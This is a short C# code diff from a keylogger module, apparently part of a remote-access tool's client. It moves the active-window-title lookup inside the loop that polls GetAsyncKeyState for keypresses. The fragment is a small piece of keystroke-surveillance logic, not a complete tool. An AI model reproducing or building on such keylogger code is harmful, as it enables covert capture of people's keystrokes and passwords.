@@ -127,12 +127,12 @@ namespace xClient.Core.Keylogger
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-
             foreach (int i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
             {
                 if (GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                 {
+                    _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
+
                     if (_hWndTitle != null)
                     {
                         if (_hWndTitle != _hWndLastTitle)
